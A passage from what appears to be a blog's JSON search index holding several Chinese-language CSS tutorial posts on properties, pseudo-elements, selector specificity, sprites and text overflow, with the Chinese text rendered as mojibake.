break-word;} text-shadow è¨­å®šæ–‡å­—çš„é™°å½± 123456.text { /* offset-x | offest-y | blur-radius | color */ text-shadow: 1px 1px 2px black; /* è·Ÿ box-shadow ä¸€æ¨£ï¼Œå¯ä»¥æœ‰å¤šå±¤é™°å½± */ text-shadow: 1px 1px 2px black 2px 2px 2px pink;} æ’ç‰ˆç›¸é—œbox-sizing è¨­å®šç›’å­çš„è¨ˆç®—æ–¹å¼ è©³ç´°ä»‹ç´¹å¯ä»¥åƒè€ƒï¼šCSS ç›’æ¨¡å‹ï¼ˆbox-modelï¼‰ 123456.box { /* å¯¬é«˜ä»£è¡¨ contentï¼ˆé è¨­ï¼‰ */ box-sizing: content-box; /* å¯¬é«˜ä»£è¡¨ content + padding + border */ box-sizing: border-box;} overflow è¨­å®šè©²æ€éº¼è™•ç†æº¢å‡ºå…§å®¹ 12345678910.box { /* è¶…å‡ºå¯¬åº¦ä¾ç„¶æœƒé¡¯ç¤ºï¼ˆé è¨­ï¼‰ */ overflow: visible; /* è¶…å‡ºå¯¬åº¦å°±éš±è— */ overflow: hidden; /* é¡¯ç¤ºæ»¾è»¸ï¼Œä¸ç®¡æœ‰æ²’æœ‰è¶…å‡ºå¯¬åº¦ */ overflow: scroll; /* è¶…å‡ºå¯¬åº¦æ™‚ï¼Œé¡¯ç¤ºæ»¾è»¸ */ overflow: auto;} max-content è®“ width ä¾ç…§å…§å®¹ä¾†èª¿æ•´ 123&lt;div&gt; &lt;h1&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit.&lt;/h1&gt;&lt;/div&gt; 123456789101112div { width: 100px; height: 50px; padding: 10px; border: 1px solid #000;}h1 { font-size: 1em; background-color: antiquewhite; /* é è¨­å¯¬åº¦æ˜¯åƒè€ƒ divï¼Œä½†ç¾åœ¨è®Šæˆåƒè€ƒã€Œæ–‡å­—å…§å®¹ã€ */ width: max-content;} å‚³çµ±ç”¨ nowrap çš„æƒ…æ³ï¼Œå…§å®¹å¯¬åº¦æ˜¯åƒè€ƒå®¹å™¨ï¼š 123456h1 { font-size: 1em; background-color: antiquewhite; /* è¶…å‡ºçš„æ–‡å­—ä¸æœƒæœ‰é¡å¤–åŠ ä¸Šå¯¬åº¦ */ white-space: nowrap;} max(base ,minimum) ç”¨ä¾†è¨­å®šæœ€å°å¯¬åº¦ï¼Œå¯ä»¥æƒ³æˆæ˜¯èªæ³•ç³–ã€‚ 12345/* æœ€å°‘ 100pxï¼Œæ¯” 100px å¤§å°±æ¡ç”¨ 50% */.box { width: 50%; min-width: 100px;} åˆ©ç”¨ max() å¯«æˆä¸€è¡Œï¼š 1234/* æœ€å°‘ 100pxï¼Œæ¯” 100px å¤§å°±æ¡ç”¨ 50% */.box { width: max(50%, 100px);} é€™å…©å€‹çµæœæœƒæ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ã€‚ min(base ,maximum) ç”¨ä¾†è¨­å®šæœ€å¤§å¯¬åº¦ï¼Œä¸€æ¨£æƒ³æˆæ˜¯èªæ³•ç³–ã€‚ 12345/* æœ€å¤š 1280pxï¼Œæ¯” 1280px å°å°±æ¡ç”¨ 90% */.container { width: 90%; max-width: 1280px;} åˆ©ç”¨ min() å¯«æˆä¸€è¡Œï¼š 1234/* æœ€å¤š 1280pxï¼Œæ¯” 1280px å°å°±æ¡ç”¨ 90% */.container { width: min(90%, 1280px);} å…¶ä»–overscroll-behavior ç”¨ä¾†é˜»æ­¢æ»¾è»¸çš„å‚³éè¡Œç‚º é è¨­æ˜¯ autoï¼Œç•¶å­å…ƒç´ æ»¾åˆ°é‚Šç•Œæ™‚ï¼Œæœƒå‚³éçµ¦çˆ¶å…ƒç´ ï¼š 123.modal__inner { overscroll-behavior: auto} è¨­å®šæˆ contain å¾Œå°±ä¸æœƒå‚³éäº†ï¼š 123.modal__inner { overscroll-behavior: contain} scrollbar-gutter è‡ªå‹•é ç•™æ»¾è»¸ç©ºé–“ å‚™è¨»ï¼šè¦è¨­å®šé€™å€‹å±¬æ€§çš„å…ƒç´  overflow å¿…é ˆæ˜¯ visible ä»¥å¤–çš„å€¼æ‰æœ‰æ•ˆï¼Œå¦å¤– &lt;body&gt; æ²’è¾¦æ³•ç”¨ã€‚ 12345.container { scrollbar-gutter: auto scrollbar-gutter: stable scrollbar-gutter: stable both-edges} é è¨­æ˜¯ autoï¼Œç•¶æ»¾è»¸å‡ºç¾çš„æ™‚å€™å®¹æ˜“è·‘ç‰ˆï¼š stable æœƒåœ¨å³é‚Šé ç•™ç©ºé–“ï¼ˆè‡ªå‹•åŠ ä¸Šä¸€æ®µ paddingï¼‰ stable æœƒåœ¨å·¦å³é‚Šéƒ½é ç•™ç©ºé–“ï¼ˆè‡ªå‹•åŠ ä¸Šä¸€æ®µ paddingï¼‰ scroll-snap-type å’Œ scroll-snap-align ç°¡å–®ä¾†èªªæƒ³æˆæ˜¯ä¸€ç¨®æ’ç‰ˆç”¨çš„ç›’å­ï¼ˆåƒ Flex æˆ– Gridï¼‰ï¼š scroll-snap-type ç”¨ä¾†è¨­å®šå®¹å™¨ scroll-snap-align ç”¨ä¾†è¨­å®šå­å…ƒç´ ã€‚ é€™å€‹å±¬æ€§èƒ½åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š è¨­å®šæ–¹å¼ï¼š 1234567891011121314151617.container { /* æ¯”è¼ƒåš´æ ¼ */ scroll-snap-type: x mandatory; /* æ²’é‚£éº¼åš´æ ¼ */ scroll-snap-type: x proximity; /* åŒæ™‚è¨­å®š x è»¸èˆ‡ y è»¸è¡Œç‚º */ scroll-snap-type: both mandatory ;}.item { /* ç”¨ä¾†è¨­å®šä¸­æ–·é»ï¼ˆä¸€å®šè¦è¨­æ‰æœ‰æ•ˆæœï¼‰ è·Ÿ justify-content çš„æ„Ÿè¦ºå¾ˆé¡ä¼¼ */ scroll-snap-align: start; scroll-snap-align: end; scroll-snap-align: center;} startï¼š endï¼š centerï¼š mandatory èˆ‡ proximity çš„å·®åˆ¥åƒè€ƒä¸‹åœ–ã€‚ mandatoryï¼š proximityï¼š pointer-events è¨­å®šé¼ æ¨™äº‹ä»¶ï¼Œå¯ä»¥åšå‡ºè®“ä¸Šé¢é‚£å±¤ç¢°ä¸åˆ°ï¼Œåªèƒ½ç¢°åˆ°ä¸‹é¢çš„ã€‚ å‚™è¨»ï¼šå› ç‚ºé€™å€‹å±¬æ€§æœƒç¹¼æ‰¿ï¼Œæ‰€ä»¥ä¸‹é¢çš„è¨˜å¾—è¦åœ¨è¨­å®šä¸€æ¬¡ã€‚ ä»¥ä¸‹æŠŠ &lt;a&gt; çš„é¼ æ¨™äº‹ä»¶åœç”¨ï¼Œæ‰€ä»¥åªæœ‰ &lt;span&gt; ä¸Šçš„ :hover æœƒè¢«è§¸ç™¼ï¼š 123&lt;a href=\"#\"&gt; &lt;span&gt;enable-event&lt;/span&gt;&lt;/a&gt; 123456789101112131415161718192021222324a { /* åœç”¨ a çš„é¼ æ¨™äº‹ä»¶ */ pointer-events: none; display: inline-block; text-decoration: none; width: 100px; height: 100px; background-color: rgba(0,0,0,0.5); text-align: center;}/* è¨­å®šç¢°åˆ° a çš„ hover æ•ˆæœ */a:hover span { color: red;}span { /* å•Ÿç”¨ span çš„é¼ æ¨™äº‹ä»¶ */ pointer-events: all; line-height: 100px; color: white;}/* è¨­å®šç¢°åˆ° span çš„ hover æ•ˆæœ */span:hover { color: red;} Outputï¼š","link":"/2022/01/13/css-property/"},{"title":"CSS pseudo-element","text":"åšå¤§ç²¾æ·±ã€‚ ::before ::afterå‚™è¨»ï¼šé€™é‚Šåªä»‹ç´¹é€™å…©å€‹ï¼Œå…¶ä»–å¯ä»¥åƒè€ƒï¼šå½å…ƒç´ ä¸€è¦½è¡¨ ç‚ºäº†è·Ÿ Pseudo-class åšå€åˆ¥ï¼Œæœƒç”¨ã€Œ::ã€ä¾†è¡¨ç¤ºã€‚ å®ƒçš„ä½œç”¨å°±å¾ˆåƒæ˜¯å¹«ä½ ç”¢ç”Ÿä¸€å€‹è™›æ“¬çš„ &lt;span&gt;ï¼Œç„¶å¾Œå¯ä»¥è¨­å®šå…§å®¹è·Ÿæ¨£å¼æ˜¯ä»€éº¼ï¼š 123&lt;div&gt;100&lt;/div&gt;&lt;div&gt;100&lt;/div&gt;&lt;div&gt;100&lt;/div&gt; 1234/* $100 */div::before{ content: '$';} ä½†æ³¨æ„ä¸€å®šè¦è¨­å®š contentï¼Œä¸ç„¶ä¸æœƒç”¢ç”Ÿè™›æ“¬å…ƒç´ ã€‚å¦‚æœæ²’æœ‰å…§å®¹èƒ½è¨­å®šæˆã€Œç©ºå­—ä¸²ã€ã€‚ å¦å¤– content é‚„æœ‰ä¸€å€‹ç‰¹åˆ¥çš„å€¼ï¼šattr()ï¼Œå¯ä»¥æŠŠæ¨™ç±¤çš„å±¬æ€§å€¼ç•¶ä½œå…§å®¹ï¼š 123&lt;div data-symbol=\"NTD\"&gt;100&lt;/div&gt;&lt;div data-symbol=\"USD\"&gt;100&lt;/div&gt;&lt;div data-symbol=\"TWD\"&gt;100&lt;/div&gt; 123456789/* è¨˜å¾— attr å…§ä¸è¦åŠ å¼•è™Ÿ 100NTD 100USD 100TWD*/div::before { content: attr(data-symbol);} é€™æ¨£çš„å¥½è™•æ˜¯å¯ä»¥è®“ HTML ä¹¾æ·¨å¾ˆå¤šï¼Œä¸ç„¶ä½ åŸæœ¬å¾—é€™æ¨£å¯«ï¼š 123&lt;div&gt;100&lt;span&gt;NTD&lt;/span&gt;&lt;/div&gt;&lt;div&gt;100&lt;span&gt;USD&lt;/span&gt;&lt;/div&gt;&lt;div&gt;100&lt;span&gt;TWD&lt;/span&gt;&lt;/div&gt;","link":"/2022/01/12/css-pseudo-element/"},{"title":"CSS åˆ©ç”¨ Signature ä¾†è®“å°è¦½åˆ—æ›´å¥½å¯«","text":"å¶ç„¶ç¿»æ›¸å­¸åˆ°çš„ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªå°±æ˜¯åœ¨ body ä¸Šæ·»åŠ ç‰¹å®šçš„ class / id ä¾†è¡¨ç¤ºã€Œç‹€æ…‹ã€ã€‚ ä¾†çœ‹ä¸€å€‹åœ¨å¯«å°è¦½åˆ—æŒ‰éˆ•æ™‚å¸¸æœƒç¢°åˆ°çš„å•é¡Œï¼Œå‡è¨­æœ‰å€‹é é¢çš„ HTML é•·é€™æ¨£ï¼š 1234567&lt;!-- é é¢ä¸€ --&gt;&lt;ul&gt; &lt;li&gt;&lt;a class=\"link current\" href=\"#\"&gt;é é¢ä¸€&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢äºŒ&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢ä¸‰&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢å››&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; ç‚ºäº†è®“ user çŸ¥é“ç›®å‰æ‰€åœ¨ä½ç½®ï¼Œé€šå¸¸æœƒç”¨ CSS æŠŠé‚£å€‹ç›®å‰çš„ä½ç½®çµ¦ã€Œæ¨™ç¤ºå‡ºä¾†ã€ï¼Œæ‰€ä»¥æ ¹æ“šä¸Šé¢çš„å…§å®¹ï¼Œæœƒé€™æ¨£å¯«ï¼š 1234567.link { color: black;}/* æ”¹æˆç´…å­—ä»£è¡¨ç›®å‰ä½ç½® */.link.active { color: red;} å¥½ï¼Œæœ€éº»ç…©å•é¡Œä¾†äº†ã€‚å¦‚æœæˆ‘è¦è®“å…¶ä»–é é¢ä¹Ÿèƒ½é…åˆé€™å€‹ CSSï¼Œæˆ‘å°±å¾—æ”¹ HTMLï¼š 12345678&lt;!-- é é¢äºŒ --&gt;&lt;ul&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢ä¸€&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link current\" href=\"#\"&gt;é é¢äºŒ&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢ä¸‰&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;é é¢å››&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!-- å…¶ä»–ä»¥æ­¤é¡æ¨ --&gt; åªæ˜¯åŠ å€‹ class å¥½åƒä¸éº»ç…©ï¼Ÿä¹Ÿè¨±æ˜¯é€™æ¨£æ²’éŒ¯ã€‚å¯æ˜¯ï¼Œå¦‚æœä½ æœ‰ 100 å€‹é é¢ï¼Œæœ‰å¤© PM é€™æ¨£è·Ÿä½ èªªï¼š æ¬¸æ¬¸ï¼Œé‚£å€‹ current çš„èªæ„ä¸å¤ªå¥½æ‡‚ï¼Œæ”¹æˆ active å¥½å—ï¼Ÿ é€™ä¸‹ä½ é™¤äº†æ”¹ä¸€éš» CSS æª”æ¡ˆä»¥å¤–ï¼Œä½ é‚„å¾—æŠŠæ¯å€‹é é¢çš„ HTML éƒ½èª¿æ•´æˆ activeã€‚é€™å€‹æ™‚å€™ä½ é‚„è¦ºå¾—ä¸éº»ç…©å—ï¼Ÿ æ‰€ä»¥å…¶å¯¦æœ‰æ›´å¥½çš„åšæ³•ï¼Œåƒè€ƒä»¥ä¸‹è§£æ³•ï¼š 12345678&lt;body id=\"home\"&gt; &lt;ul&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page1\"&gt;é é¢ä¸€&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page2\"&gt;é é¢äºŒ&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page3\"&gt;é é¢ä¸‰&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page4\"&gt;é é¢å››&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt; 12345678910111213141516171819.link { color: blue;}/* home é é¢å°±æ¨™ç¤ºå‡ºä¾† */#home .link[href=\"page1\"] { color: red;}/* about é é¢å°±æ¨™ç¤ºå‡ºä¾† */#about .link[href=\"page2\"] { color: red;}/* servie é é¢å°±æ¨™ç¤ºå‡ºä¾† */#servie .link[href=\"page3\"] { color: red;}/* product é é¢å°±æ¨™ç¤ºå‡ºä¾† */#product .link[href=\"page4\"] { color: red;} é€™å€‹å°±è·Ÿ JavaScript è£¡çš„ event delegation æœ‰é»ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œèˆ‡å…¶å¾æŒ‰éˆ•ä¾†åˆ¤å®šç›®å‰ç‹€æ…‹ï¼Œå€’ä¸å¦‚äº¤çµ¦ä¸Šå±¤çš„çˆ¶å…ƒç´ ä¾†è™•ç†ä¸å°±å¥½äº†ï¼Ÿ é›–ç„¶é€™å€‹åšæ³•ä¸€æ¨£è¦èª¿æ•´ HTMLï¼Œä½†è¦èª¿æ•´çš„åœ°æ–¹æœƒå°‘å¾ˆå¤šã€‚å› ç‚ºä½ æŠŠã€Œç‹€æ…‹ã€éƒ½äº¤çµ¦ body ä¾†æ§åˆ¶äº†ã€‚ ç›®å‰åªæœ‰é€£çµå¯èƒ½æ„Ÿå—ä¸å¤ªåˆ°å·®ç•°ï¼Œå¯æ˜¯ç•¶æœ‰å…¶ä»–é¡ä¼¼çš„æ¨£å¼ä¹Ÿæ˜¯é‡å°ã€Œç‰¹å®šé é¢ã€ä¾†è™•ç†çš„æ™‚å€™ï¼Œå°±æœƒæ˜ç™½ç¾åœ¨çš„åšæ³•æ¯”è¼ƒå¥½ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œç¾åœ¨æŠŠç‹€æ…‹éƒ½é€é body çš„ class / id ä¾†ç®¡ç†ï¼Œä½ åªè¦æŠŠé‡é»è‘—é‡åœ¨ CSS å°±å¥½ï¼Œä¸ç”¨å†é‡å°ç‰¹å®šå…ƒç´ ä¾†ä¸€å€‹ä¸€å€‹èª¿æ•´äº†ã€‚","link":"/2022/03/05/css-signature/"},{"title":"CSS Selector çš„æ¬Šé‡","text":"åŸä¾†å¦‚æ­¤ã€‚ å¤§æ–¹å‘å¯ä»¥å…ˆè¨˜ä¸€å€‹å¤§æ–¹å‘ï¼šid &gt; class &gt; æ¨™ç±¤ï¼Œè¶Šè©³ç´°çš„è´ HTMLï¼š å‚™è¨»ï¼šä¸‹é¢è¦ç¤ºç¯„çš„æ˜¯æ”¹ Pick me çš„æ–‡å­—è‰²å½© 1234567&lt;div class=\"wrapper\"&gt; &lt;div class=\"list\"&gt; &lt;div class=\"item\" id=\"pickme\"&gt; Pick me &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSSï¼š 123456.wrapper { color: red;}.item { color: pink;} æŒ‰ç…§å‰›å‰›èªªçš„è¦å‰‡ï¼Œ .item è·Ÿ .wrapper æ¬Šé‡é›–ç„¶ä¸€æ¨£ï¼Œä½†æ˜¯ .item æœƒæ¯”è¼ƒè©³ç´°ã€‚ä¸€å€‹æ˜¯ã€Œç¹¼æ‰¿ã€ï¼Œä¸€å€‹æ˜¯ã€Œç›´æ¥é¸åˆ°å…ƒç´ ã€ï¼Œæ‰€ä»¥ Pick me æœ€å¾Œæœƒå¥—ç”¨ .item çš„è¦å‰‡ã€‚ å†ä¾†çœ‹ä¸€å€‹ï¼š 123456789.wrapper { color: red;}.item { color: pink;}#pickme { color: blue;} é€™æ™‚å€™æ˜é¡¯æ˜¯ #pickme è´é item è·Ÿ .wrapperï¼Œå› ç‚º id &gt; classã€‚æ‰€ä»¥ Pick me æœ€å¾Œæœƒå¥—ç”¨ #pickme çš„è¦å‰‡ã€‚ å†ä¾†çœ‹ä¸€å€‹ï¼š 123456789101112.wrapper { color: red;}.item { color: pink;}div.wrapper &gt; div.list &gt; div.item { color: yellow;}#pickme { color: blue;} é€™æ™‚å€™é›–ç„¶ div.wrapper &gt; div.list &gt; div.item çœ‹èµ·ä¾†å¾ˆè©³ç´°ï¼Œä½†å®ƒé‚„æ˜¯æ¯”ä¸é idï¼Œæ‰€ä»¥ Pick me æœ€å¾Œé‚„æ˜¯æœƒå¥—ç”¨åˆ° #pickme çš„è¦å‰‡ã€‚ æ¬Šé‡çš„è¨ˆç®—æ–¹å¼ç†è§£å¤§æ–¹å‘å¾Œï¼Œä½ å¯ä»¥æŠŠå‰›å‰›çš„è¦å‰‡æƒ³æˆæ˜¯é€™æ¨£å­ï¼š èˆ‰ä¾‹ä¾†èªªï¼š å¦‚æœ selector æœ‰ idï¼Œid æ¬„ä½çš„åˆ†æ•¸å°±æ˜¯ 1ï¼Œæ²’æœ‰çš„è©±å°±æ˜¯ 0 å¦‚æœ selector æœ‰ 2 å€‹ tagï¼Œtag æ¬„ä½çš„åˆ†æ•¸å°±æ˜¯ 2 å¦‚æœ selector æœ‰ 3 å€‹ classï¼Œclass æ¬„ä½çš„åˆ†æ•¸å°±æ˜¯ 3 å¦‚æœè¦å‰‡è£¡æœ‰ !importantï¼Œ!important æ¬„ä½çš„åˆ†æ•¸å°±æ˜¯ 1ï¼Œæ²’æœ‰çš„è©±å°±æ˜¯ 0 å¦‚æœæ˜¯ inline-styleï¼Œinline-style æ¬„ä½çš„åˆ†æ•¸å°±æ˜¯ 1ï¼Œæ²’æœ‰çš„è©±å°±æ˜¯ 0 æ‰€ä»¥æŠŠå‰›å‰›çš„ä¾‹å­æ‹¿ä¾†è¨ˆç®—æœƒæ˜¯é€™æ¨£å­ï¼š 123456789101112131415161718192021/* !important è·Ÿ inline-style çš„éƒ¨åˆ†éƒ½æ˜¯ 0ï¼Œ æ‰€ä»¥é€™é‚Šå…ˆå¿½ç•¥å‰é¢çš„å…©å€‹ 0*//* 0, 1, 0 */.wrapper { color: red;}/* 0, 1, 0 */.item { color: pink;}/* 0, 3, 3 */div.wrapper &gt; div.list &gt; div.item { color: yellow;}/* 1, 0, 0 */#pickme { color: blue;} æ‰€ä»¥ä¸Šé¢çš„æ¬Šé‡å°±æœƒæ˜¯ï¼š #pickme &gt; div.wrapper &gt; div.list &gt; div.item &gt; .item = .wrapper æ¬Šé‡å¦‚æœä¸€æ¨£ï¼Œå°±çœ‹ä½ç½®ï¼Œåœ¨ã€Œå¾Œé¢ã€çš„é‚£å€‹æœƒè¢«å¥—ç”¨ï¼Œæ‰€ä»¥ .item æœƒè“‹æ‰ .wrapperã€‚ å¦å¤–è¦ç‰¹åˆ¥æ³¨æ„æ¯å€‹æ¬„ä½è¦ã€Œæ‹†é–‹ä¾†çœ‹ã€ï¼Œä¸è¦åˆåœ¨ä¸€èµ·ç•¶æˆæ•¸å­—ï¼Œä¸ç„¶å¾ˆå®¹æ˜“æéŒ¯ã€‚ ä¾‹å¦‚èªªï¼š 12 å€‹ class =&gt; 120 1 å€‹ id æ˜¯ =&gt; 100 é€™æ¨£æœƒèª¤ä»¥ç‚ºæ˜¯ 120 æ¯”è¼ƒå¤§ï¼Œä½†æ˜¯ä¸æ˜¯é€™æ¨£ã€‚ä¸€å®šè¦æ‹†é–‹ä¾†çœ‹ï¼š 12 å€‹ class =&gt; 0, 12, 0 1 å€‹ id æ˜¯ =&gt; 1, 0, 0 æ„æ€æ˜¯èªªç„¡è«–ä½ æœ‰å¹¾å€‹ classï¼Œä½ éƒ½ä¸å¯èƒ½è“‹æ‰ idï¼Œå› ç‚º id çš„æ¬Šé‡æ°¸é æ¯” class é«˜ï¼Œä¸æ˜¯é€¢åå°±èƒ½é€²ä½ã€‚ !important æˆ– inline-style ä¹Ÿæ˜¯ç›¸åŒé“ç†ï¼Œä½ ç”¨å†å¤š class æˆ– id éƒ½ä¸å¯èƒ½è“‹æ‰ï¼š 123456789101112/* 0, 0, 0, 1, 0 */.wrapper { color: red;}/* 1, 0, 0, 1, 0 */.item { color: pink !important;}/* 0, 1, 0, 3, 3 */div.wrapper &gt; div.list &gt; div#pickme.item { color: yellow;}","link":"/2022/01/12/css-specificity/"},{"title":"CSS åˆ©ç”¨ Sprite ä¾†æå‡æ•ˆèƒ½","text":"å¸Œæœ›æœ‰æœä¸€æ—¥èƒ½æ´¾ä¸Šç”¨å ´ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªå°±æ˜¯ã€ŒæŠŠå¾ˆå¤šå¼µåœ–ç‰‡æ‹¼æˆä¸€å¼µã€ï¼Œé€™æ¨£å¯ä»¥çœä¸‹ç™¼ request çš„æ¬¡æ•¸ã€‚ å¯ä»¥æƒ³æˆæ˜¯åœ¨çª—å¤–æ”¾äº†ä¸€å€‹è¶…å¤§çš„æµ·å ±ï¼Œåªè¦èª¿æ•´æµ·å ±çš„ä½ç½®ï¼Œå°±æœƒçœ‹åˆ°ä¸ä¸€æ¨£çš„ç•«é¢ï¼Œé€™å€‹å°±æ˜¯ Sprite çš„æŠŠæˆ²ã€‚ å¯¦ä½œç›´æ¥ä¾†çœ‹å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘æœ‰ä¸€å¼µåœ–ç‰‡é•·é€™æ¨£ï¼š æˆ‘æƒ³æŠŠå®ƒåšæˆä¸‰é¡† &lt;button&gt;ï¼Œæ‰€ä»¥ HTML é•·é€™æ¨£ï¼š 12345&lt;div class=\"buttons\"&gt; &lt;button&gt;&lt;/button&gt; &lt;button&gt;&lt;/button&gt; &lt;button&gt;&lt;/button&gt;&lt;/div&gt; æ¥ä¸‹ä¾†å°±ä¾†ç”¨ CSS åšå‡º Spriteã€‚å…ˆå¤§æ¦‚è¬›ä¸€ä¸‹åŸç†ï¼š å¹«æ¯å€‹ &lt;button&gt; éƒ½å¥—ç”¨åŒä¸€å¼µèƒŒæ™¯åœ–ç‰‡ åˆ©ç”¨ background-position ä¾†èª¿æ•´ä½ç½®ï¼ˆé€™å€‹æ˜¯é‡é»ï¼‰ æ‰€ä»¥ CSS å°±æœƒé€™æ¨£å¯«ï¼š 123456789101112131415161718192021222324.buttons { width: 300px; padding: 10px; margin: auto; border: 1px solid #000;}/* æ¯å€‹æŒ‰éˆ•çš„å…±é€šæ¨£å¼ */button { width: 51px; height: 51px; background-image: url('./button.png'); background-repeat: no-repeat; background-color: transparent; border: none; padding: 0;}/* æŠŠèƒŒæ™¯åœ–ç‰‡å¾€å·¦ç§» 51 px */button:nth-child(2) { background-position: -51px 0;}/* æŠŠèƒŒæ™¯åœ–ç‰‡å¾€å·¦ç§» 102 px */button:nth-child(3) { background-position: -102px 0;} å‚™è¨»ï¼šæ¯å€‹æŒ‰éˆ•çš„å¯¬é«˜æ˜¯ç”±åœ–ç‰‡ä¾†æ±ºå®šã€‚åƒé€™é‚Šçš„åœ–ç‰‡å°ºå¯¸ç‚º 154x51ï¼Œæ‰€ä»¥ä¸€å€‹æŒ‰éˆ•æ‰è¨­å®šç‚º 51x51 æˆåŠŸçš„è©±å°±æœƒé•·é€™æ¨£ï¼š ä»¥ä¸Šå°±æ˜¯ Sprite çš„æŠ€å·§ï¼Œé›–ç„¶é€™å€‹æŠ€å·§æœƒèŠ±æ¯”è¼ƒå¤šå·¥å¤«ï¼Œä½†å–„ç”¨çš„è©±å°±èƒ½ç‚ºä¼ºæœå™¨ç¯€çœä¸å°‘æµé‡èˆ‡è² æ“”ã€‚","link":"/2022/03/05/css-sprite/"},{"title":"åœ¨ CSS ä¸­åšå­—ä¸²æ‹¼æ¥","text":"ä»¥å‰ä¸çŸ¥é“çš„å°æŠ€å·§ã€‚ ç°¡è¿°åˆ©ç”¨æ“¬å…ƒç´ ï¼ˆPseudo-elementï¼‰ç”¢ç”Ÿçš„æ–‡å­—å…§å®¹å…¶å¯¦æ˜¯å¯ä»¥åšå­—ä¸²æ‹¼æ¥çš„ï¼Œä¾‹å¦‚èªªï¼š 123456 &lt;ul&gt; &lt;li&gt;aaaa&lt;/li&gt; &lt;li&gt;bbbb&lt;/li&gt; &lt;li&gt;cccc&lt;/li&gt; &lt;li&gt;dddd&lt;/li&gt;&lt;/ul&gt; 12345li::before { content: 'String' 'A' '&amp;' 'C'; color: red; margin-right: 10px; } Outputï¼š åªè¦ç”¨ã€Œå¼•è™Ÿ ''ã€ä¾†éš”é–‹è¦æ‹¼æ¥çš„å­—ä¸²å°±å¯ä»¥äº†ï¼ˆç©ºæ ¼å¯æœ‰å¯ç„¡ï¼Œä½†å»ºè­°ç©ºå•¦æ¯”è¼ƒå¥½è®€ï¼‰ æ­é… counter ä¾†ä½¿ç”¨æ‰€ä»¥ä½ å°±èƒ½åˆ©ç”¨é€™å€‹ç‰¹æ€§ä¾†åšå‡ºå°ˆå±¬çš„åˆ—è¡¨ç·¨è™Ÿï¼š 123456&lt;ul&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt; &lt;li&gt;Title&lt;/li&gt;&lt;/ul&gt; 123456789101112131415ul { margin: 0; padding: 0; counter-reset: order;}li { list-style: none; counter-increment: order;}li::before { /* åœ¨é€™è£¡è‡ªå®šå…§å®¹ */ content: 'Q' counter(order) ':'; color: red; margin-right: 10px;} Outputï¼š","link":"/2022/01/22/css-string-concatenation/"},{"title":"CSS è®“æ–‡å­—æœ‰ ... çš„æ•ˆæœ","text":"éœ€æ±‚ä¸å¤§çš„è©±åˆ©ç”¨å®ƒå°‘å¯«ä¸€é» JavaScriptã€‚ ä¸æœƒæ»¿å‡ºä¾†å›‰å‚™è¨»ï¼šé€™åªé©ç”¨æ–¼å–®è¡Œæ–‡å­—ï¼Œå¦‚æœè¦å¤šè¡Œæ–‡å­—è«‹æ”¹ç”¨ JavaScript ä¾†è™•ç†ï¼Œæˆ–ä¹Ÿå¯ä»¥åƒè€ƒ CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º â€¦ çš„æ•ˆæœ HTMLï¼š 1234&lt;div class=\"box\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum&lt;/div&gt; CSSï¼š 123456.box { width: 100px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;} è§£é‡‹ä¸€ä¸‹ç‚ºä»€éº¼è¦åŒæ™‚è¨­å®šé€™ä¸‰å€‹å±¬æ€§ï¼š white-space: nowrap =&gt; è®“æ–‡å­—åªæœƒæœ‰ä¸€è¡Œ overflow: hidden =&gt; è®“è¶…å‡ºçš„ box çš„ç¯„åœéš±è—èµ·ä¾† text-overflow: ellipsis =&gt; è®“è¢«éš±è—çš„æ–‡å­—é¡¯ç¤ºã€Œâ€¦ã€ å°±é€™éº¼ç°¡å–®å›‰ã€‚","link":"/2022/01/13/css-text-overflow/"},{"title":"CSS ä¹‹æˆ‘çš„æ–‡å­—å¤ªé•·å•¦","text":"å¤ªé•·å•¦ã€‚ æ–‡å­—å¤ªé•·å¦‚æœæœ‰ä¸€æ®µæ–‡å­—å¾ˆé•·ï¼Œéƒ½æ²’æœ‰ã€Œç©ºç™½ã€æˆ–ã€Œæ›è¡Œã€ï¼š 1&lt;div class=\"box\"&gt; HeyHelloyoapplebanannaverylongworldiwatchimaciphoneiwatchimaciphoneiwatchimaciphone&lt;/div&gt; ç€è¦½å™¨å°±æ²’è¾¦æ³•åˆ¤æ–·è©²åœ¨å“ªè£¡æ–·è¡Œï¼Œé€™æ™‚å€™æ–‡å­—å°±æœƒè¶…å‡º box çš„ç¯„åœï¼š è¦è§£æ±ºé€™å€‹è¾¦æ³•å¯ä»¥è¨­å®šword-breakï¼šbreak-all ï¼š ä½†å¦‚æœç¾åœ¨æ˜¯æœ‰ç©ºæ ¼ï¼Œåªæ˜¯æœ‰æŸå€‹å–®å­—ç‰¹åˆ¥é•·ï¼Œå°±ä¸å»ºè­°ç”¨ 